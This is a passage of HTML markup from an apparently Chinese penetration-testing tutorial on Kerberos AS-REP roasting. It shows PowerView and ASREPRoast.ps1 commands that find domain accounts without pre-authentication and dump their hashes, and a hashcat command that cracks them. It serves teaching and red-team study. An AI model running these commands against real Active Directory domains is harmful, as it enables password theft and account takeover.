8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5976520811099253" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/29_a8t8QRraOEFweyCCV1iaBxm65Qonsg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBltUtsNMBKO77wGgnKWcJxGENNLia8t8QRraOEFweyCCV1iaBxm65Qonsg/640?wx_fmt=png'" data-type="png" data-w="937" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521175858205</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如上图所示，成功找到了可以利用的用户 bunny 并得到了该用户的哈希，然后我们使用 Hashcat 等工具对获得的 Hash 进行爆破就行了。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">将哈希值保存到 hash.txt 中，并且修改为 Hashcat 能识别的格式，即在&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">$krb5asrep</code>&nbsp;后面添加一个&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">$23</code>&nbsp;拼接：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.20023696682464456" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/30_Yx17CQax6AOA8nVOlaH2Oj1VicNMyg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBleFfOad9ia0hV0gKuqRSdhS3yLQYx17CQax6AOA8nVOlaH2Oj1VicNMyg/640?wx_fmt=png'" data-type="png" data-w="844" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521180416847</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后使用以下命令爆破就行了：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">hashcat</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exe </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">m </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">18200</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> hash</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">txt wordlists</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">txt </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">--</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">force</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如下图所示，爆破成功，得到明文密码：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.44427083333333334" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/31_FbyCGdRA3r8emtm522WBb7Na4f0ucQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlyzCkAFEE4N3UWsXGwQibA9VvbFbyCGdRA3r8emtm522WBb7Na4f0ucQ/640?wx_fmt=png'" data-type="png" data-w="1920" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521183324452</figcaption></figure><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">利用 Powerview.ps1</h3><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>项目地址：https://github.com/EmpireProject/Empire/</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">我们也可以利用 Empire 框架下的 powerview.ps1 查找域中设置了 "不需要kerberos预身份验证" 的用户</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="powershell" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Module</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\powerview</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ps1</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">DomainUser</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">PreauthNotRequired</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.65625" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/32_dlyfrpXaBiaCiaKwZVH9tM3XkXiabA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlq3BCoVv43H0Gh6hpJTgicic0LHI0QdlyfrpXaBiaCiaKwZVH9tM3XkXiabA/640?wx_fmt=png'" data-type="png" data-w="960" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521183851707</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">使用ASREPRoast.ps1获取AS-REP返回的Hash</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>ASREPRoast.ps1 项目地址：https://github.com/HarmJ0y/ASREPRoast/</span></p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Module</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\A</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">SREPRoast</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ps1</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ASREPHash</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">UserName</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> bunny </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Domain</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> whoamianony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.1409185803757829" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/33_eTZInS10ibPAk9Q2z3bwdMHD4QTssQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlsdeUJg723P4yqdX75VfJzWicEUeTZInS10ibPAk9Q2z3bwdMHD4QTssQ/640?wx_fmt=png'" data-type="png" data-w="958" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521184349456</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后就是像上面那样对哈希值进行爆破了。</p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__0" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(163, 163, 163) !important;"><img data-ratio="0.109375" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/34_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" data-type="png" data-w="640" style="box-sizing: border-box !important;visibility: visible !important;width: 640px !important;"></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__1" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span style="color: rgb(0, 0, 0);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)">推荐阅读：</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span style="color: rgb(0, 0, 0);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"><br  /></strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span style="color: rgb(0, 0, 0);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247497760&amp;idx=1&amp;sn=4c0f57ba9203cc115a85cd0c011fdc43&amp;chksm=ec1cad1fdb6b2409ec3ef25008ad6834a7220997a914308a478ed9d682c84c7b370e423a878c&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">内网渗透 | Kerberos 协议与 Kerberos 认证原理</a><br  /></strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__3" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__3" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, 